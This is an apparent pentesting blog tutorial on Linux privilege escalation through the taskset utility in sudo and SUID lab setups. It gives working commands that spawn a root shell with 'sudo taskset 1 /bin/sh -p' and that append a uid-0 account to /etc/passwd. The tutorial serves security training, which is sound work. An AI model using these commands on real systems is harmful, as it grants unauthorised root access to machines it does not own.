<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/privilege-escalation/" rel="category tag">Privilege Escalation</a></span>            </div>
            <h1 class="post-title entry-title">Linux for Pentester: Taskset Privilege Escalation</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/linux-for-pentester-taskset-privilege-escalation/" rel="bookmark"><time class="entry-date published" datetime="2019-06-26T13:50:57+00:00">June 26, 2019</time><time class="updated" datetime="2025-06-07T14:02:53+00:00">June 7, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p class="ai-optimize-52 ai-optimize-introduction"><span style="color: #000000;">In this article, we’ll talk about <strong>taskset</strong> command which is a Linux utility and learn how helpful the tasket command is for Linux penetration testing and how we’ll progress tasket utility to scale the greater privilege shell.</span></p>
<p class="ai-optimize-7"><span style="color: #000000;"><strong><em>Note: “The main objective of publishing the series of “Linux for pentester” is to introduce the circumstances and any kind of hurdles that can be faced by any pentester while solving CTF challenges or OSCP labs which are based on Linux privilege escalations. Here we do not criticizing any kind of misconfiguration that a network or system administrator does for providing higher permissions on any programs/binaries/files &amp; etc.”  </em></strong></span></p>
<h3 class="ai-optimize-8"><span style="color: #800000;"><strong>Table of Content</strong></span></h3>
<ul>
<li class="ai-optimize-9"><span style="color: #000000;">Introduction to TASKSET</span></li>
<li class="ai-optimize-10"><span style="color: #000000;">Major Functions of TASKSET command</span></li>
<li class="ai-optimize-11"><span style="color: #000000;">Sudo rights Lab setups for Privilege Escalation</span></li>
<li class="ai-optimize-12"><span style="color: #000000;">Exploiting Sudo Rights</span></li>
<li class="ai-optimize-13"><span style="color: #000000;">SUID Lab setup for privilege escalation</span></li>
<li class="ai-optimize-14"><span style="color: #000000;">Exploiting SUID Rights</span></li>
</ul>
<h3 class="ai-optimize-15"><span style="color: #800000;"><strong>Introduction to TASKSET</strong></span></h3>
<p class="ai-optimize-16"><span style="color: #000000;">Taskset is used to set or retrieve the CPU affinity of a running process given its PID or to launch a new COMMAND with a given CPU affinity. The CPU affinity is a scheduler property that “bonds” a process to a given set of CPUs on the system. The Linux scheduler will honor the given CPU affinity and the process will not run on any other CPUs. Note that the Linux scheduler also supports natural CPU affinity: the scheduler attempts to keep processes on the same CPU as long as practical for performance reasons. Therefore, forcing a specific CPU affinity is useful only in certain applications.</span></p>
<h3 class="ai-optimize-17"><span style="color: #800000;"><strong>Major Functions of Tasket command</strong></span></h3>
<p class="ai-optimize-18"><span style="color: #000000;">At first, we will run <strong>taskset -h</strong> command which means help and which will tell us about all the options which are available in TASKSET command as we can see in the picture below.</span></p>
<pre class="lang:default decode:true">taskset -h</pre>
<p class="ai-optimize-19"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-YZtrPyL0bUA/XRN2OxWmw1I/AAAAAAAAe9s/tSTXDMgx5PgFC_s0kj8gsnpuvxFsz20oACLcBGAs/s1600/1.png"/></span></p>
<h3 class="ai-optimize-20"><span style="color: #800000;"><strong>Top Command:</strong></span></h3>
<p class="ai-optimize-21"><span style="color: #000000;">​The top command is one of the basic commands to monitor server processes in Linux. The top command shows all running processes in the server. It shows you the system information and the processes information just like up-time, average load, tasks running, no. of users logged in, no. of CPU processes, RAM utilization and it lists all the processes running/utilized by the users in your server.</span></p>
<p class="ai-optimize-22"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-IUln0JKgV9A/XRN2O-xA7SI/AAAAAAAAe9k/vMM4CJpwGOs6GsVBye40HLviVkvWeJWWwCLcBGAs/s1600/2.png"/></span></p>
<h3 class="ai-optimize-23"><span style="color: #800000;"><strong>Usage</strong></span></h3>
<p class="ai-optimize-24"><span style="color: #000000;">I will take the process id (PID) of 1988 as shown in the above image as an example to show the usage of taskset command.</span></p>
<ul>
<li class="ai-optimize-25"><span style="color: #000000;">If you want taskset to display CPU affinity of all the tasks of an already running process (PID), use the command in the following way:</span></li>
</ul>
<pre class="lang:default decode:true">taskset -ap 1988</pre>
<ul>
<li class="ai-optimize-26"><span style="color: #000000;">If you want taskset to display CPU affinity of only a current task of an already running process (PID), use the command in the following way:</span></li>
</ul>
<pre class="lang:default decode:true">taskset -p 1998</pre>
<ul>
<li class="ai-optimize-27"><span style="color: #000000;">If you want taskset to display CPU affinity of an already running process (PID) in a list format, use the command in the following way:</span></li>
</ul>
<pre class="lang:default decode:true">taskset -cp 1988</pre>
<p class="ai-optimize-28"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-aeb7CDGsZn0/XRN2O5AlqbI/AAAAAAAAe9o/PSFxaHvsKjMCZ1RDzMOQkxIlVsdk8CEfgCLcBGAs/s1600/3.png"/></span></p>
<h3 class="ai-optimize-29"><span style="color: #800000;"><strong>Sudo rights Lab setup for Privilege Escalation</strong></span></h3>
<p class="ai-optimize-30"><span style="color: #000000;">Now here our next step is to set up the lab of Sudo rights or in other words to provide Sudo privileges to a user for the taskset executable. Here we are going to add a user by the name of the <strong>test </strong>in the Sudoer’s file and we have given permission to user test to run the <strong>taskset </strong>command as the <strong>root </strong>user.</span></p>
<p class="ai-optimize-31"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-84FmTQVkW0Q/XRN2P9m5VfI/AAAAAAAAe9w/huUrOJFe6cIwJu-_vXNuzzPy77YqYk9IQCLcBGAs/s1600/4.png"/></span></p>
<h3 class="ai-optimize-32"><span style="color: #800000;"><strong>Exploiting Sudo Rights</strong></span></h3>
<p class="ai-optimize-33"><span style="color: #000000;">Now we will connect through <strong>ssh </strong>in kali and after that, we will run <strong>sudo -l</strong> which is sudo list and through which we can see that user test has the permission to run taskset as a root user.</span></p>
<pre class="lang:default decode:true">ssh test@192.168.1.105
sudo -l</pre>
<p class="ai-optimize-34"><span style="color: #000000;">Now our next step is to exploit sudo rights through taskset command, so we will run the below-mentioned command with sudo rights and will get the bash shell of the target machine with root privileges.</span></p>
<pre class="lang:default decode:true">sudo taskset 1 /bin/sh –p
id</pre>
<p class="ai-optimize-35"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-lgGvCmpTkWg/XRN2QJrEfXI/AAAAAAAAe90/2u0v9d-HTRI_bF0tZ2iC0xHsHpnL7txQwCLcBGAs/s1600/5.png"/></span></p>
<h3 class="ai-optimize-36"><span style="color: #800000;"><strong>SUID Lab setups for Privilege Escalation</strong></span></h3>
<p class="ai-optimize-37"><span style="color: #000000;">As we know the <strong>SUID</strong> bit permission enables the user to execute any files as the ownership of existing file member. Now we are enabling <strong>SUID</strong> permission on <strong>taskset</strong> so that a local user can take the opportunity of <strong>taskset</strong> as the root user.</span></p>
<p class="ai-optimize-38"><span style="color: #000000;">Type the following commands for enabling the SUID bit:</span></p>
<pre class="lang:default decode:true">which taskset
chmod u+s /usr/bin/taskset
ls –la /usr/bin/taskset</pre>
<p class="ai-optimize-39"><span style="color: #000000;">Now from the below image you can see the suid bit is set for taskset, now it’s time for the exploitation.</span></p>
<p class="ai-optimize-40"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-mA4rVyTtFfU/XRN2Qa-6IFI/AAAAAAAAe94/xYQj9voKQXE5TZxnY-oGDgvfsG0MehV6gCLcBGAs/s1600/6.png"/></span></p>
<h3 class="ai-optimize-41"><span style="color: #800000;"><strong>Exploiting SUID</strong></span></h3>
<p class="ai-optimize-42"><span style="color: #000000;">Now again we will connect through <strong>ssh </strong>in kali to our victim machine using test user and after that, we will use<strong> Find</strong> command to identify binaries having SUID permission.</span></p>
<pre class="lang:default decode:true">find / -perm -u=s -type f 2&gt;/dev/null</pre>
<p class="ai-optimize-43"><span style="color: #000000;">So from the below image, we can confirm that SUID bit is enabled for our concerned binary:  <strong>/usr/bin/taskset</strong></span></p>
<p class="ai-optimize-44"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-qma-IH3chrU/XRN2QmYaaJI/AAAAAAAAe98/saM_Csu_V68RRJparlpTxV-MlP3lqN9GwCLcBGAs/s1600/7.png"/></span></p>
<p class="ai-optimize-45"><span style="color: #000000;">As we now know that we can run <strong>taskset </strong>with root privileges, so we are going to take advantage of that fact to add a new user with root privileges to /etc/passwd file, so that we can get access of the target machine with full root privileges.</span></p>
<p class="ai-optimize-46"><span style="color: #000000;">Create a password hash for new user <strong>mark </strong>and password <strong>pass123</strong> using openssl.</span></p>
<pre class="lang:default decode:true">openssl passwd -1 –salt mark pass123</pre>
<p class="ai-optimize-47"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-MI3wIxGt4ww/XRN2Ql5nh7I/AAAAAAAAe-A/gL40cKQ8cQsGha7T0S-3eDqt-225adS0gCLcBGAs/s1600/8.png"/></span></p>
<p class="ai-optimize-48"><span style="color: #000000;">Now using <strong>echo</strong> with the <strong>taskset </strong>command we have added the new user <strong>mark </strong>with root privileges into the /etc/passwd file of the target machine and then log in the system with <strong>mark</strong> using <strong>su</strong> command and enjoy the root privileges.</span></p>
<pre class="lang:default decode:true">taskset 1 echo 'mark:$1$mark$PL9HIgTDwnE9sG27q2Nrb/:0:0:root/:root:/bin/bash' &gt;&gt;/etc/passwd
su mark
id</pre>
<p class="ai-optimize-49"><span style="color: #000000;"><strong>Conclusion:</strong> In this post, we have talked on taskset command to demonstrate how a to intruder can escalate the privilege using tasket utility due to permissions allowed on it.</span></p>
<p class="ai-optimize-50"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-B0oLA7WbWuQ/XRN2RIvK8lI/AAAAAAAAe-E/IjGxSvttN-Y7dgDM8WZ4-kpucdtD89KSwCLcBGAs/s1600/9.png"/></span></p>
<p class="ai-optimize-6"><span style="color: #000000;">To Learn more about Privilege Escalation. Follow this</span> <a href="https://www.hackingarticles.in/category/privilege-escalation/">Link.</a></p>
<p class="ai-optimize-51"><span style="color: #000000;"><strong>Author</strong>: Auqib Wani is a Certified Ethical Hacker, Penetration Tester and a Tech Enthusiast with more than 5 years of experience in the field of Network &amp; Cyber Security. Contact <strong><a style="color: #000000;" href="https://www.linkedin.com/in/auqib-wani-14210a71/">Here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
